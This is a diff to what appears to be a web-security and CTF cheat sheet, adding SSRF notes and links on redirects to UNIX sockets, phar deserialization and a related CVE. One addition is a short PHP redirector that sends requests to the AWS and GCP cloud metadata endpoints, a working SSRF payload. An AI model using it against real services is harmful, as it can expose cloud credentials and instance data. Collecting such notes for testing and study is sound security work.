@@ -384,6 +384,21 @@ Clone:
     127.0.513 == 127.0.2.1
     ```
     - https://ma.ttias.be/theres-more-than-one-way-to-write-an-ip-address/
+- rewrite rule redirects to UNIX socket
+    - [Disable redirects to UNIX sockets by szmarczak · Pull Request \#2047 · sindresorhus/got · GitHub](https://github.com/sindresorhus/got/pull/2047)
+- bypass host rules with redirect
+    - https://cloudsek.com/appsmith-patches-full-read-ssrf-vulnerabilities-reported-by-cloudsek/
+    ```php
+    <?php
+    $server = $_GET["server"];
+    if($server == "gcp") {
+        header("Location: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/");
+    }
+    elseif($server == "aws") {
+        header("Location: http://169.254.169.254/latest/meta-data/");
+    }
+    ?>
+    ```
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 - [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
 - https://github.com/jmdx/TLS-poison/
@@ -867,7 +882,8 @@ sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username
 ### php
 
 - [GitHub \- ambionics/phpggc: PHPGGC is a library of PHP unserialize\(\) payloads along with a tool to generate them, from command line or programmatically\.](https://github.com/ambionics/phpggc/)
-- https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/
+- [RedTeam Pentesting \- Blog \- Insecure Deserialization \- How to Trace Down a Gadget Chain](https://blog.redteam-pentesting.de/2021/deserialization-gadget-chain/)
+- TrueType-phar polyglot: [CVE-2022-41343 \- RCE via Phar Deserialisation](https://tantosec.com/blog/cve-2022-41343/)
 
 # Path Traversal / Local File Inclusion (LFI)
 
